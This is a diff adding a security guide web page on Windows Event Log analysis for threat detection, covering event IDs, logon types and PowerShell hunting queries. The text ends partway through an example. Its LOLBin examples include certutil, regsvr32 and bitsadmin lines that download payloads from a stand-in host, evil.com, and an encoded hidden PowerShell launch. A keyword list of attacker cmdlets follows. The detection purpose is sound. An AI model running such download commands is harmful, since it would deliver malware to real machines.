@@ -1,0 +1,1192 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- SEO Meta Tags -->
+    <title>Windows Event Log Analysis Guide 2025 | Security Monitoring | TheHGTech</title>
+    <meta name="description"
+        content="Complete Windows Event Log analysis guide for security professionals. Learn critical Event IDs, PowerShell analysis, threat detection, and SIEM integration for incident response.">
+    <meta name="keywords"
+        content="Windows Event Log, Event ID 4624, Event ID 4625, security monitoring, threat detection, SIEM, PowerShell event analysis, Windows security logs, incident response">
+    <meta name="author" content="TheHGTech">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://thehgtech.com/guides/windows-event-log-analysis.html">
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="Windows Event Log Analysis Guide 2025">
+    <meta property="og:description"
+        content="Complete guide to Windows Event Log analysis for threat detection and incident response.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://thehgtech.com/guides/windows-event-log-analysis.html">
+    <meta property="og:image" content="https://thehgtech.com/images/guides/windows-event-log-analysis.png">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Windows Event Log Analysis Guide 2025">
+    <meta name="twitter:description" content="Complete guide to Windows Event Log analysis for threat detection.">
+
+    <!-- Structured Data -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "TechArticle",
+      "headline": "Windows Event Log Analysis Guide 2025",
+      "description": "Complete guide to Windows Event Log analysis for security professionals. Critical Event IDs, PowerShell analysis, and threat detection techniques.",
+      "author": {
+        "@type": "Organization",
+        "name": "TheHGTech"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "TheHGTech",
+        "url": "https://thehgtech.com"
+      },
+      "datePublished": "2025-12-17",
+      "dateModified": "2025-12-17",
+      "mainEntityOfPage": "https://thehgtech.com/guides/windows-event-log-analysis.html",
+      "articleSection": "Security Guides",
+      "keywords": ["Windows Events", "Security Monitoring", "Threat Detection", "SIEM"]
+    }
+    </script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/header.css">
+    <link rel="stylesheet" href="/print.css">
+    <link rel="stylesheet" href="/light-mode.css">
+    <link rel="stylesheet" href="/interaction-bar.css?v=20251207-0041">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #000000;
+            --bg-secondary: #0a0a0a;
+            --bg-card: rgba(255, 255, 255, 0.03);
+            --accent-cyan: #00D9FF;
+            --accent-red: #FF4C4C;
+            --accent-green: #10b981;
+            --accent-orange: #f59e0b;
+            --accent-purple: #8b5cf6;
+            --accent-blue: #3b82f6;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --text-muted: #666666;
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .guide-header {
+            padding: 3rem 0 2rem;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 3rem;
+            margin-top: 60px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+        }
+
+        h2 {
+            color: var(--accent-cyan);
+            margin: 2.5rem 0 1rem;
+            font-size: 1.8rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border);
+        }
+
+        h3 {
+            color: var(--text-primary);
+            margin: 1.5rem 0 1rem;
+            font-size: 1.3rem;
+        }
+
+        h4 {
+            color: var(--accent-blue);
+            margin: 1.25rem 0 0.75rem;
+            font-size: 1.1rem;
+        }
+
+        p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        ul,
+        ol {
+            margin-left: 2rem;
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+        }
+
+        .info-box {
+            background: rgba(0, 217, 255, 0.05);
+            border-left: 4px solid var(--accent-cyan);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+        }
+
+        .warning-box {
+            background: rgba(255, 76, 76, 0.05);
+            border-left: 4px solid var(--accent-red);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+        }
+
+        .success-box {
+            background: rgba(16, 185, 129, 0.05);
+            border-left: 4px solid var(--accent-green);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+        }
+
+        code {
+            background: var(--bg-card);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: var(--accent-cyan);
+            font-size: 0.9rem;
+        }
+
+        pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: var(--accent-green);
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 2rem;
+            color: var(--accent-cyan);
+            text-decoration: none;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: var(--bg-card);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th,
+        td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        th {
+            background: rgba(0, 217, 255, 0.1);
+            color: var(--accent-cyan);
+            font-weight: 600;
+        }
+
+        td {
+            color: var(--text-secondary);
+        }
+
+        .event-id {
+            display: inline-block;
+            background: rgba(59, 130, 246, 0.2);
+            color: var(--accent-blue);
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-family: monospace;
+            font-weight: 600;
+        }
+
+        .severity-critical {
+            color: var(--accent-red);
+        }
+
+        .severity-high {
+            color: var(--accent-orange);
+        }
+
+        .severity-medium {
+            color: var(--accent-cyan);
+        }
+
+        .severity-low {
+            color: var(--accent-green);
+        }
+
+        .toc {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .toc h3 {
+            margin-top: 0;
+            color: var(--accent-cyan);
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 0.5rem;
+        }
+
+        .toc a {
+            color: var(--text-secondary);
+            text-decoration: none;
+        }
+
+        .toc a:hover {
+            color: var(--accent-cyan);
+        }
+
+        .log-category {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        .cat-security {
+            background: rgba(255, 76, 76, 0.2);
+            color: #FF4C4C;
+        }
+
+        .cat-system {
+            background: rgba(245, 158, 11, 0.2);
+            color: #f59e0b;
+        }
+
+        .cat-application {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+        }
+
+        .cat-powershell {
+            background: rgba(59, 130, 246, 0.2);
+            color: #3b82f6;
+        }
+
+        .quick-ref {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .quick-ref-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+        }
+
+        .quick-ref-card h4 {
+            margin-top: 0;
+        }
+    </style>
+
+    <!-- Mobile Navigation CSS -->
+    <link rel="stylesheet" href="/m-core.css?v=4.2">
+    <link rel="stylesheet" href="/m-layout.css?v=3.2">
+    <link rel="stylesheet" href="/m-components.css?v=3.0">
+    <script src="/m-app.js?v=4.3" defer></script>
+</head>
+
+<body>
+    <!-- Mobile Header -->
+    <header class="m-header m-only">
+        <div class="m-header__logo" style="display: flex; align-items: center; gap: 0.75rem;">
+            <img src="../logo-dark.png" alt="TheHGTech" class="m-logo-img logo-dark"
+                style="height: 28px; width: auto; margin: 0;">
+            <img src="../logo-light.png" alt="TheHGTech" class="m-logo-img logo-light"
+                style="height: 28px; width: auto; margin: 0;">
+            <span
+                style="font-size: 1.2rem; font-weight: 700; background: linear-gradient(135deg, #FF3D3D, #ff8c8c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">TheHGTech</span>
+        </div>
+        <div class="m-header__actions">
+            <button class="m-theme-toggle" onclick="mToggleTheme()" aria-label="Toggle Theme">
+                <span class="m-theme-toggle__thumb"></span>
+                <span class="m-theme-toggle__stars">
+                    <span class="m-theme-toggle__star"></span>
+                    <span class="m-theme-toggle__star"></span>
+                </span>
+            </button>
+            <button class="m-header__btn m-header__btn--search" data-action="search" aria-label="Search">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Bottom Navigation -->
+    <nav class="m-bottom-nav m-only">
+        <a href="/" class="m-bottom-nav__item">
+            <i class="fas fa-home"></i>
+            <span>Home</span>
+        </a>
+        <a href="/cve-tracker.html" class="m-bottom-nav__item">
+            <i class="fas fa-bug"></i>
+            <span>CVE</span>
+        </a>
+        <a href="/threat-intel.html" class="m-bottom-nav__item">
+            <i class="fas fa-shield-alt"></i>
+            <span>Intel</span>
+        </a>
+        <a href="/articles.html" class="m-bottom-nav__item">
+            <i class="fas fa-newspaper"></i>
+            <span>Articles</span>
+        </a>
+        <a href="/guides/" class="m-bottom-nav__item active">
+            <i class="fas fa-book"></i>
+            <span>Guides</span>
+        </a>
+    </nav>
+
+    <!-- Header -->
+    <header class="header" role="banner">
+        <div class="header-content">
+            <div class="logo">
+                <a href="../index.html"
+                    style="text-decoration: none; display: flex; align-items: center; gap: 0.75rem;">
+                    <img src="../logo-dark.png" alt="TheHGTech Logo" class="logo-img logo-dark">
+                    <img src="../logo-light.png" alt="TheHGTech Logo" class="logo-img logo-light">
+                    <span class="logo-text">TheHGTech</span>
+                </a>
+            </div>
+            <nav class="nav" role="navigation">
+                <a href="../index.html#news">News</a>
+                <a href="../threat-intel.html">Threat Intelligence <span class="live-badge">LIVE</span></a>
+                <a href="../cve-tracker.html">CVE</a>
+                <a href="../guides/">Guides</a>
+                <a href="../comparisons/">Tool Comparisons</a>
+                <a href="../articles.html">Articles</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <a href="/guides/" class="back-link">← Back to Guides</a>
+
+        <div class="guide-header">
+            <h1>Windows Event Log Analysis</h1>
+            <p style="color: var(--text-muted); font-size: 1.1rem;">Master security event analysis for threat detection
+                and incident response</p>
+            <div style="margin-top: 1rem; color: var(--text-muted);">
+                <span>📖 22 min read</span> • <span>🎯 Intermediate</span> • <span>📅 December 2025</span>
+            </div>
+        </div>
+
+        <div class="info-box">
+            <strong>💡 Why This Matters:</strong> Windows Event Logs are the primary source of truth for security
+            investigations. Understanding how to analyze them is essential for SOC analysts, incident responders, and
+            threat hunters.
+        </div>
+
+        <!-- Table of Contents -->
+        <div class="toc">
+            <h3>📋 Table of Contents</h3>
+            <ul>
+                <li><a href="#fundamentals">1. Event Log Fundamentals</a></li>
+                <li><a href="#critical-events">2. Critical Security Event IDs</a></li>
+                <li><a href="#authentication">3. Authentication Analysis</a></li>
+                <li><a href="#process-execution">4. Process Execution Monitoring</a></li>
+                <li><a href="#lateral-movement">5. Lateral Movement Detection</a></li>
+                <li><a href="#powershell">6. PowerShell Analysis</a></li>
+                <li><a href="#queries">7. PowerShell Queries</a></li>
+                <li><a href="#siem">8. SIEM Integration</a></li>
+                <li><a href="#quick-reference">9. Quick Reference Card</a></li>
+            </ul>
+        </div>
+
+        <h2 id="fundamentals">1. Event Log Fundamentals</h2>
+
+        <p>Windows stores events in several log files, each serving a specific purpose. Understanding where to look is
+            the first step in effective analysis.</p>
+
+        <h3>Primary Log Locations</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Log</th>
+                    <th>Path</th>
+                    <th>Purpose</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><span class="log-category cat-security">Security</span></td>
+                    <td><code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></td>
+                    <td>Authentication, authorization, policy changes</td>
+                </tr>
+                <tr>
+                    <td><span class="log-category cat-system">System</span></td>
+                    <td><code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></td>
+                    <td>Services, drivers, system components</td>
+                </tr>
+                <tr>
+                    <td><span class="log-category cat-application">Application</span></td>
+                    <td><code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></td>
+                    <td>Application-specific events</td>
+                </tr>
+                <tr>
+                    <td><span class="log-category cat-powershell">PowerShell</span></td>
+                    <td><code>Microsoft-Windows-PowerShell%4Operational.evtx</code></td>
+                    <td>PowerShell script execution</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Event Log Structure</h3>
+
+        <p>Each Windows event contains these key fields:</p>
+
+        <ul>
+            <li><strong>Event ID:</strong> Unique identifier for the event type</li>
+            <li><strong>TimeCreated:</strong> When the event occurred</li>
+            <li><strong>Provider Name:</strong> Source component that generated the event</li>
+            <li><strong>Level:</strong> Severity (Information, Warning, Error, Critical)</li>
+            <li><strong>Computer:</strong> Hostname where the event occurred</li>
+            <li><strong>Security ID:</strong> User/account associated with the event</li>
+            <li><strong>Message:</strong> Human-readable description</li>
+            <li><strong>EventData:</strong> Structured data specific to each event type</li>
+        </ul>
+
+        <pre><code># View event log structure in PowerShell
+Get-WinEvent -LogName Security -MaxEvents 1 | Format-List *</code></pre>
+
+        <h3>Enabling Advanced Auditing</h3>
+
+        <p>By default, Windows logs minimal security events. Enable advanced auditing to capture detailed information:
+        </p>
+
+        <pre><code># Enable via GPO: Computer Configuration → Windows Settings 
+#  → Security Settings → Advanced Audit Policy Configuration
+
+# Or via auditpol command:
+auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+auditpol /set /subcategory:"Logoff" /success:enable
+auditpol /set /subcategory:"Process Creation" /success:enable
+auditpol /set /subcategory:"Security Group Management" /success:enable</code></pre>
+
+        <div class="warning-box">
+            <strong>⚠️ Important:</strong> Enable "Include command line in process creation events" via GPO to capture
+            full command lines in Event ID 4688. This is critical for threat hunting.
+        </div>
+
+        <h2 id="critical-events">2. Critical Security Event IDs</h2>
+
+        <h3>Authentication Events</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Event ID</th>
+                    <th>Description</th>
+                    <th>Importance</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><span class="event-id">4624</span></td>
+                    <td>Successful logon</td>
+                    <td class="severity-high">High</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4625</span></td>
+                    <td>Failed logon</td>
+                    <td class="severity-critical">Critical</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4634</span></td>
+                    <td>Logoff</td>
+                    <td class="severity-medium">Medium</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4647</span></td>
+                    <td>User initiated logoff</td>
+                    <td class="severity-medium">Medium</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4648</span></td>
+                    <td>Explicit credentials used (RunAs)</td>
+                    <td class="severity-high">High</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4672</span></td>
+                    <td>Special privileges assigned to new logon</td>
+                    <td class="severity-critical">Critical</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4776</span></td>
+                    <td>NTLM authentication (on DC)</td>
+                    <td class="severity-high">High</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Account Management Events</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Event ID</th>
+                    <th>Description</th>
+                    <th>Importance</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><span class="event-id">4720</span></td>
+                    <td>User account created</td>
+                    <td class="severity-critical">Critical</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4722</span></td>
+                    <td>User account enabled</td>
+                    <td class="severity-high">High</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4724</span></td>
+                    <td>Password reset attempt</td>
+                    <td class="severity-high">High</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4728</span></td>
+                    <td>Member added to security-enabled global group</td>
+                    <td class="severity-critical">Critical</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4732</span></td>
+                    <td>Member added to security-enabled local group</td>
+                    <td class="severity-critical">Critical</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4756</span></td>
+                    <td>Member added to universal security group</td>
+                    <td class="severity-critical">Critical</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Process and Object Events</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Event ID</th>
+                    <th>Description</th>
+                    <th>Importance</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><span class="event-id">4688</span></td>
+                    <td>New process created</td>
+                    <td class="severity-critical">Critical</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4689</span></td>
+                    <td>Process exited</td>
+                    <td class="severity-low">Low</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4697</span></td>
+                    <td>Service installed</td>
+                    <td class="severity-critical">Critical</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4698</span></td>
+                    <td>Scheduled task created</td>
+                    <td class="severity-critical">Critical</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4663</span></td>
+                    <td>Object access attempt (files, registry)</td>
+                    <td class="severity-high">High</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h2 id="authentication">3. Authentication Analysis</h2>
+
+        <h3>Understanding 4624 - Successful Logon</h3>
+
+        <p>Event ID 4624 is one of the most important security events. It contains critical information about how and
+            where authentication occurred.</p>
+
+        <h4>Key Fields in 4624</h4>
+
+        <pre><code>Subject:
+    Security ID:     S-1-5-18 (SYSTEM or user performing action)
+    Account Name:    WORKSTATION$
+    
+Logon Information:
+    Logon Type:      10 (RemoteInteractive = RDP)
+    Logon Process:   User32
+    
+New Logon:
+    Security ID:     S-1-5-21-xxx (Target user SID)
+    Account Name:    john.smith
+    Account Domain:  CONTOSO
+    Logon ID:        0x1A2B3C (Correlate with 4634 for session duration)
+    
+Network Information:
+    Workstation Name: ATTACKERPC
+    Source Network Address: 192.168.1.100
+    Source Port:     52341</code></pre>
+
+        <h4>Logon Type Reference</h4>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Type</th>
+                    <th>Name</th>
+                    <th>Description</th>
+                    <th>Risk</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>2</code></td>
+                    <td>Interactive</td>
+                    <td>Console login (keyboard)</td>
+                    <td class="severity-medium">Normal</td>
+                </tr>
+                <tr>
+                    <td><code>3</code></td>
+                    <td>Network</td>
+                    <td>SMB, WMI, PowerShell remoting</td>
+                    <td class="severity-high">Monitor</td>
+                </tr>
+                <tr>
+                    <td><code>4</code></td>
+                    <td>Batch</td>
+                    <td>Scheduled tasks</td>
+                    <td class="severity-medium">Normal</td>
+                </tr>
+                <tr>
+                    <td><code>5</code></td>
+                    <td>Service</td>
+                    <td>Windows service start</td>
+                    <td class="severity-medium">Normal</td>
+                </tr>
+                <tr>
+                    <td><code>7</code></td>
+                    <td>Unlock</td>
+                    <td>Workstation unlock</td>
+                    <td class="severity-low">Normal</td>
+                </tr>
+                <tr>
+                    <td><code>9</code></td>
+                    <td>NewCredentials</td>
+                    <td>RunAs /netonly</td>
+                    <td class="severity-high">Suspicious</td>
+                </tr>
+                <tr>
+                    <td><code>10</code></td>
+                    <td>RemoteInteractive</td>
+                    <td>RDP</td>
+                    <td class="severity-high">Monitor</td>
+                </tr>
+                <tr>
+                    <td><code>11</code></td>
+                    <td>CachedInteractive</td>
+                    <td>Cached credentials (offline)</td>
+                    <td class="severity-medium">Normal</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Understanding 4625 - Failed Logon</h3>
+
+        <p>Failed logons are critical for detecting brute force attacks, password spraying, and unauthorized access
+            attempts.</p>
+
+        <h4>Common Failure Codes</h4>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Status Code</th>
+                    <th>Sub-Status</th>
+                    <th>Meaning</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>0xC000006D</code></td>
+                    <td><code>0xC000006A</code></td>
+                    <td>Bad password</td>
+                </tr>
+                <tr>
+                    <td><code>0xC000006D</code></td>
+                    <td><code>0xC0000064</code></td>
+                    <td>User does not exist</td>
+                </tr>
+                <tr>
+                    <td><code>0xC0000234</code></td>
+                    <td>—</td>
+                    <td>Account locked out</td>
+                </tr>
+                <tr>
+                    <td><code>0xC0000072</code></td>
+                    <td>—</td>
+                    <td>Account disabled</td>
+                </tr>
+                <tr>
+                    <td><code>0xC000006E</code></td>
+                    <td>—</td>
+                    <td>Account restriction (hours, workstation)</td>
+                </tr>
+                <tr>
+                    <td><code>0xC0000193</code></td>
+                    <td>—</td>
+                    <td>Account expired</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="info-box">
+            <strong>💡 Detection Tip:</strong> Multiple 4625 events with Sub-Status <code>0xC000006A</code> (bad
+            password) from different accounts but the same source IP indicates password spraying.
+        </div>
+
+        <h2 id="process-execution">4. Process Execution Monitoring</h2>
+
+        <h3>Event ID 4688 - Process Creation</h3>
+
+        <p>This is the gold standard for detecting malicious activity. When properly configured, it captures the full
+            command line of every process.</p>
+
+        <pre><code>Process Information:
+    New Process ID:      0x1234
+    New Process Name:    C:\Windows\System32\cmd.exe
+    Creator Process ID:  0x5678
+    Creator Process Name: C:\Windows\explorer.exe
+    
+    Command Line:        cmd.exe /c whoami & net user
+    Token Elevation Type: TokenElevationTypeFull (UAC bypassed/admin)
+    
+Subject:
+    Account Name:        john.smith
+    Account Domain:      CONTOSO</code></pre>
+
+        <h3>Suspicious Process Patterns</h3>
+
+        <h4>1. LOLBins (Living Off the Land Binaries)</h4>
+        <pre><code># Suspicious uses of legitimate Windows binaries
+certutil.exe -urlcache -split -f http://evil.com/malware.exe
+mshta.exe javascript:evil()
+regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
+wmic.exe process call create "powershell -enc base64..."
+bitsadmin.exe /transfer job http://evil.com/malware.exe c:\temp\m.exe</code></pre>
+
+        <h4>2. Encoded PowerShell</h4>
+        <pre><code># Base64 encoded commands (-enc, -encodedcommand)
+powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZ...
+
+# Detection: Look for -enc, -e, -encodedcommand with base64 string</code></pre>
+
+        <h4>3. Unusual Parent-Child Relationships</h4>
+        <pre><code># Suspicious parent → child processes
+Word.exe → cmd.exe or powershell.exe     (Macro malware)
+wmiprvse.exe → powershell.exe            (WMI lateral movement)
+svchost.exe → cmd.exe                    (Service abuse)
+explorer.exe → mshta.exe                 (HTA malware)</code></pre>
+
+        <h2 id="lateral-movement">5. Lateral Movement Detection</h2>
+
+        <h3>RDP (Remote Desktop)</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Event ID</th>
+                    <th>Log</th>
+                    <th>Location</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><span class="event-id">4624</span></td>
+                    <td>Security</td>
+                    <td>Target</td>
+                    <td>Logon Type 10</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">21</span></td>
+                    <td>TerminalServices-LocalSessionManager</td>
+                    <td>Target</td>
+                    <td>RDP session logon</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">25</span></td>
+                    <td>TerminalServices-LocalSessionManager</td>
+                    <td>Target</td>
+                    <td>RDP session reconnect</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">1149</span></td>
+                    <td>TerminalServices-RemoteConnectionManager</td>
+                    <td>Target</td>
+                    <td>RDP authentication success</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>PsExec and Remote Services</h3>
+
+        <pre><code># PsExec creates a service on the target
+Event ID 4697: Service installed (PSEXESVC)
+Event ID 7045: New service installed (System log)
+
+# Correlate with:
+Event ID 4624: Logon Type 3 (Network)
+Event ID 4688: cmd.exe or powershell.exe with parent svchost.exe</code></pre>
+
+        <h3>WMI-based Attacks</h3>
+
+        <pre><code># WMI process creation leaves these traces:
+Event ID 4688: Process created by WmiPrvSE.exe
+Event ID 4648: Explicit credentials used
+
+# WMI-Activity log (if enabled):
+Microsoft-Windows-WMI-Activity/Operational
+Event ID 5857: Provider loaded
+Event ID 5861: Temporary event consumer</code></pre>
+
+        <h2 id="powershell">6. PowerShell Analysis</h2>
+
+        <p>PowerShell is heavily used by both administrators and attackers. Proper logging is essential.</p>
+
+        <h3>Enable PowerShell Logging</h3>
+
+        <pre><code># GPO: Computer Configuration → Administrative Templates 
+#      → Windows Components → Windows PowerShell
+
+# 1. Module Logging
+Turn on Module Logging: Enabled
+Module Names: *
+
+# 2. Script Block Logging (CRITICAL!)
+Turn on PowerShell Script Block Logging: Enabled
+Log script block invocation start/stop events: Enabled
+
+# 3. Transcription (optional, disk intensive)
+Turn on PowerShell Transcription: Enabled</code></pre>
+
+        <h3>Key PowerShell Event IDs</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Event ID</th>
+                    <th>Log</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><span class="event-id">4103</span></td>
+                    <td>PowerShell Operational</td>
+                    <td>Module logging (pipeline execution)</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4104</span></td>
+                    <td>PowerShell Operational</td>
+                    <td>Script block logging (full script content)</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4105</span></td>
+                    <td>PowerShell Operational</td>
+                    <td>Script block start</td>
+                </tr>
+                <tr>
+                    <td><span class="event-id">4106</span></td>
+                    <td>PowerShell Operational</td>
+                    <td>Script block stop</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Suspicious PowerShell Indicators</h3>
+
+        <pre><code># Look for these in Event ID 4104:
+-ExecutionPolicy Bypass
+-NoProfile -NonInteractive -WindowStyle Hidden
+Invoke-Expression (IEX)
+DownloadString, DownloadFile
+Net.WebClient
+[System.Convert]::FromBase64String
+-enc, -encodedcommand
+Invoke-Mimikatz, Invoke-Shellcode
+Add-Type -TypeDefinition (inline C# compilation)</code></pre>
+
+        <h2 id="queries">7. PowerShell Queries for Analysis</h2>
+
+        <h3>Find Failed Logons</h3>
+
+        <pre><code># Get failed logon attempts in last 24 hours
+$startTime = (Get-Date).AddHours(-24)
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    ID = 4625
+    StartTime = $startTime
+} | ForEach-Object {
+    [PSCustomObject]@{
+        Time = $_.TimeCreated
+        User = $_.Properties[5].Value
+        Domain = $_.Properties[6].Value
+        SourceIP = $_.Properties[19].Value
+        Status = $_.Properties[7].Value
+        SubStatus = $_.Properties[9].Value
+    }
+} | Format-Table -AutoSize</code></pre>
+
+        <h3>Find RDP Sessions</h3>
+
+        <pre><code># Get RDP sessions (Logon Type 10)
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    ID = 4624
+} | Where-Object { $_.Properties[8].Value -eq 10 } | 
+ForEach-Object {
+    [PSCustomObject]@{
+        Time = $_.TimeCreated
+        User = $_.Properties[5].Value
+        SourceIP = $_.Properties[18].Value
+        Workstation = $_.Properties[11].Value
+    }
+} | Format-Table -AutoSize</code></pre>
+
+        <h3>Find New Accounts Created</h3>
+
+        <pre><code># Get new user accounts created
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    ID = 4720
+} | ForEach-Object {
+    [PSCustomObject]@{
+        Time = $_.TimeCreated
+        NewUser = $_.Properties[0].Value
+        CreatedBy = $_.Properties[4].Value
+    }
+} | Format-Table -AutoSize</code></pre>
+
+        <h3>Find Privileged Group Changes</h3>
+
+        <pre><code># Monitor Domain Admins and other privileged groups
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    ID = 4728,4732,4756
+} | ForEach-Object {
+    [PSCustomObject]@{
+        Time = $_.TimeCreated
+        EventID = $_.Id
+        MemberAdded = $_.Properties[0].Value
+        GroupName = $_.Properties[2].Value
+        ChangedBy = $_.Properties[6].Value
+    }
+} | Format-Table -AutoSize</code></pre>
+
+        <h3>Find Suspicious Processes</h3>
+
+        <pre><code># Find encoded PowerShell execution
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    ID = 4688
+} | Where-Object { 
+    $_.Properties[8].Value -match 'powershell|cmd' -and 
+    $_.Properties[8].Value -match '-enc|-e\s|base64'
+} | ForEach-Object {
+    [PSCustomObject]@{
+        Time = $_.TimeCreated
+        User = $_.Properties[1].Value
+        CommandLine = $_.Properties[8].Value
+        ParentProcess = $_.Properties[13].Value
+    }
+}</code></pre>
+
+        <h2 id="siem">8. SIEM Integration</h2>
+
+        <h3>Windows Event Forwarding (WEF)</h3>
+
+        <p>Centralize logs from all Windows systems to a collector server:</p>
+
+        <pre><code># On Collector server:
+wecutil qc
+
+# Create subscription (example for security events)
+wecutil cs subscription.xml
+
+# subscription.xml example:
+&lt;Subscription xmlns="..."&gt;
+    &lt;SubscriptionId&gt;Security-Events&lt;/SubscriptionId&gt;
